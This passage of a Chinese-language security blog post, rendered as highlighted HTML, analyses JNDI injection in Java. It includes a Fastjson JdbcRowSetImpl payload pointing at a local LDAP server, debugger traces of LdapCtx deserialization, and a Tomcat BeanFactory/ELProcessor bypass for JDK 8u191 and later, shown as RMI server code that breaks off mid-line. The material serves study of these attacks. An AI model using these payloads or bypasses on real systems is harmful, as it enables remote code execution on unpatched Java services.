+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// Fastjson反序列化JNDI注入Gadget触发</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">payload</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;{</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">@type</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">com.sun.rowset.JdbcRowSetImpl</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">dataSourceName</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">ldap://127.0.0.1:1234/ExportObject</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">,</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">autoCommit</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">:</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379">true</span><span style="color: #56B6C2">\&quot;</span><span style="color: #98C379"> }&quot;</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">JSON</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parse</span><span style="color: #ABB2BF">(payload);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306205913639.png" srcset="/img/loading.gif" lazyload alt="image-20260306205913511"></p>
+</li>
+</ul>
+<h3 id="内部调试-2"><a href="#内部调试-2" class="headerlink" title="内部调试"></a>内部调试</h3><p>现在我们来调试一下<code>lookup参数注入触发</code></p>
+<ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306210655191.png" srcset="/img/loading.gif" lazyload alt="image-20260306210655133"></p>
+</li>
+<li><p>从<code>decodeObject（）</code>开始看（上面提到过，在<code>LdapCtx</code>文件里面）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211227245.png" srcset="/img/loading.gif" lazyload alt="image-20260306211227196"></p>
+</li>
+<li><p>进到 <code>decodeObject()</code> 方法里面看到一个 <code>getURLClassLoader()</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211305213.png" srcset="/img/loading.gif" lazyload alt="image-20260306211305160"></p>
+</li>
+<li><p>往下走，进入到 <code>trustURLCodebase</code> 的判断，我们之前说过，这里默认就是 false，所以没跳进去，无法进行 URLClassLoader 的实例化。但是这个地方其实我们已经获取到字节码了，只是不实例化就无法加载，也就无法命令执行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211419528.png" srcset="/img/loading.gif" lazyload alt="image-20260306211419487"></p>
+</li>
+<li><p>我们继续往下走，有一个 <code>deserializeObject()</code></p>
+<p>字面意思就是用来反序列化的方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211507997.png" srcset="/img/loading.gif" lazyload alt="image-20260306211507958"></p>
+<p>这里被反序列化的东西，是一个 <code>javaSerializedData</code> 数据类型的类。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306211840230.png" srcset="/img/loading.gif" lazyload alt="image-20260306211840141"></p>
+</li>
+<li><p>内部逻辑的反系列化</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">deserializeObject</span><span style="color: #E06C75">(</span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] var0</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> var1) throws NamingException {</span></span>
+<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">ByteArrayInputStream</span><span style="color: #E06C75"> var2 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ByteArrayInputStream</span><span style="color: #E06C75">(var0)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> var20 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> var1 </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #C678DD">?</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: #E06C75">(var2) </span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">LoaderInputStream</span><span style="color: #E06C75">(var2</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> var1)) {</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> var5 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> ((ObjectInputStream)var20)</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readObject</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #7F848E; font-style: italic">//出现了反序列化</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> var5</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">var18</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">NamingException</span><span style="color: #E06C75"> var4 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">NamingException</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">var4</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setRootCause</span><span style="color: #ABB2BF">(var18);</span></span>
+<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> var4</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">            }</span></span>
+<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">IOException</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">var19</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">NamingException</span><span style="color: #E06C75"> var3 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">NamingException</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">var3</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setRootCause</span><span style="color: #ABB2BF">(var19);</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">throw</span><span style="color: #E06C75"> var3</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">        }</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li>
+</ul>
+<h1 id="对比RMI-LDAP"><a href="#对比RMI-LDAP" class="headerlink" title="对比RMI&amp;LDAP"></a>对比RMI&amp;LDAP</h1><p>都支持 <code>Reference</code> 注入但是</p>
+<ul>
+<li><p>LDAP 的限制直到 <strong>JDK 8u191</strong> 才开启，RMI 的远程类加载限制在 JDK 6u141&#x2F;7u131&#x2F;8u121开启</p>
+</li>
+<li><p><strong>Reference 注入</strong>：通过 <code>NamingManager</code> 触发远程类加载。两者一样</p>
+<p><strong>JavaSerializedData 注入</strong>：LDAP 允许在属性中直接存储<strong>序列化后的字节码</strong>。当客户端 <code>lookup</code> 时，会自动触发反序列化。如果目标环境中存在脆弱的 Gadget（如 CommonsCollections），即使关闭了远程类加载，依然可以实现 RCE。</p>
+<p>(<code>Reference</code> 注入（下载 <code>.class</code> 文件）会被 <code>trustURLCodebase</code> 配置拦住。但 <strong><code>javaSerializedData</code> 注入</strong> 绕过了这个限制)</p>
+</li>
+</ul>
+<h1 id="绕过高版本-jdk-的攻击"><a href="#绕过高版本-jdk-的攻击" class="headerlink" title="绕过高版本 jdk 的攻击"></a>绕过高版本 jdk 的攻击</h1><h2 id="jdk8u121-jdk8u191"><a href="#jdk8u121-jdk8u191" class="headerlink" title="jdk8u121 &lt;   &lt; jdk8u191"></a>jdk8u121 &lt;   &lt; jdk8u191</h2><p>就是我们上面说的 ldap 的 JNDI 漏洞，其实这也无关 ldap。通过 RMI 也是可以打的，这也就是 JNDI 通用漏洞，原因是可以动态加载字节码，分析过程和上面是一样的，也有断点，这里就不赘述了</p>
+<p>看一下对于<code>jdk8u191之后的版本</code>对比一下更新点：</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 旧版本JDK  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> /**  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">className</span><span style="color: #7F848E; font-style: italic"> A non-null fully qualified class name.  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">codebase</span><span style="color: #7F848E; font-style: italic"> A non-null, space-separated list of URL strings.  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> */</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">loadClass</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> codebase)  </span></span>
+<span class="line"><span style="color: #E06C75"> throws ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> MalformedURLException {  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> parent </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getContextClassLoader</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> cl </span><span style="color: #56B6C2">=</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">URLClassLoader</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">getUrlArray</span><span style="color: #ABB2BF">(codebase), parent);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">loadClass</span><span style="color: #E06C75">(className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> cl)</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> }  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">// 新版本JDK  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> /**  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">className</span><span style="color: #7F848E; font-style: italic"> A non-null fully qualified class name.  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">codebase</span><span style="color: #7F848E; font-style: italic"> A non-null, space-separated list of URL strings.  </span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"> */</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">loadClass</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> codebase)  </span></span>
+<span class="line"><span style="color: #E06C75"> throws ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> MalformedURLException {  </span></span>
+<span class="line"><span style="color: #E06C75">     </span><span style="color: #7F848E; font-style: italic">//更新点在这，在使用 URLClassLoader 加载器加载远程类之前加了个if语句检测</span></span>
+<span class="line"><span style="color: #E06C75">     </span><span style="color: #7F848E; font-style: italic">//根据 trustURLCodebase的值是否为true 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 trustURLCodebase 的值是否为 true 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。这个在前面也说过了</span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #98C379">&quot;true&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equalsIgnoreCase</span><span style="color: #ABB2BF">(trustURLCodebase)</span><span style="color: #E06C75">) {  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> parent </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getContextClassLoader</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">ClassLoader</span><span style="color: #E06C75"> cl </span><span style="color: #56B6C2">=</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #E5C07B">URLClassLoader</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">getUrlArray</span><span style="color: #ABB2BF">(codebase), parent);</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">loadClass</span><span style="color: #E06C75">(className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> cl)</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> }  </span></span>
+<span class="line"><span style="color: #E06C75"> }</span></span></code></pre></div></div></figure>
+
+<h2 id="jdk8u191-之后"><a href="#jdk8u191-之后" class="headerlink" title="jdk8u191 之后"></a>jdk8u191 之后</h2><blockquote>
+<p>先从本地进行加载，再从 codebase 进行加载，但是从 codecase 中加载类时，不同于 RMI 在 RegistryContext 的修复在这里是 loadClass 添加了 trustURLCodebase 进行修复，是 true 的时候才允许从远端进行加载。它走到获得引用对象那里都是 ok 的，只是不允许远程从工厂位置加载类。说明引用对象还是可以利用的。</p>
+</blockquote>
+<p>攻击方式是：<strong>利用本地恶意 Class 作为Reference Factory</strong></p>
+<p>跟一下，走到了类加载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306153123873.png" srcset="/img/loading.gif" lazyload alt="image-20260306153116756"></p>
+<p>加的<code>if</code>就是我们上面提到的  <code>trustURLCodebase的值是否为true 的值来进行判断</code></p>
+<h3 id="绕过手法一"><a href="#绕过手法一" class="headerlink" title="绕过手法一"></a>绕过手法一</h3><blockquote>
+<p>利用本地恶意 Class 作为 Reference Factory，本地加载工厂对象，执行工厂对象的恶意方法</p>
+<p>要想本地加载工厂对象，我们直接找<code>ObjectFactory接口</code>的实现类</p>
+<p>找依赖优先找最常见的,最终选择 tomcat 的 org.apache.naming.factory.BeanFactory   调用了BeanFactory. getObjectInstance</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306154636751.png" srcset="/img/loading.gif" lazyload alt="image-20260306154636691"></p>
+<p>而且只有javax.el.ELProcessor#eval    和   groovy.lang.GroovyShel1#evaluate可以符合BeanFactory的调用条件（只传一个String类型的参数）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306200418280.png" srcset="/img/loading.gif" lazyload alt="image-20260306200418239"></p>
+</blockquote>
+<ul>
+<li><p>看一下<code>BeanFactory</code>逻辑</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306155314172.png" srcset="/img/loading.gif" lazyload alt="image-20260306155314118"></p>
+<p>主要是这里，通过反射实现</p>
+<p>参数可控就可以执行我们自己的代码</p>
+</li>
+</ul>
+<p>这里我们以<code>rmi</code>为例吧：</p>
+<ul>
+<li><p>先导入tomcat依赖</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.apache.tomcat.embed&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;tomcat-embed-core&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;8.5.73&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;org.apache.tomcat.embed&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;tomcat-embed-el&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;8.5.73&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+</li>
+<li><p>先启动<code>RMIServer</code>打开注册中心</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.AlreadyBoundException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.RemoteException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.registry.LocateRegistry</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.registry.Registry</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">RMIServer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">RemoteException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">AlreadyBoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">IRemoteObj</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">remoteObj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RemoteObjImpl</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//在服务端创建远程对象，实现与客户端通讯</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Registry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">r</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LocateRegistry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createRegistry</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1099</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">//注册中心（1099为固定端口）</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        r.bind(&quot;remoteObj&quot;, remoteObj);//绑定服务，命名为“remoteObj“</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p><code>JNDIRMIServerBypass</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.StringRefAddr</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.spi.ResourceRef</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDIRMIServerBypass</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ResourceRef</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ref</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ResourceRef</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;javax.el.ELProcessor&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">,</span></span>
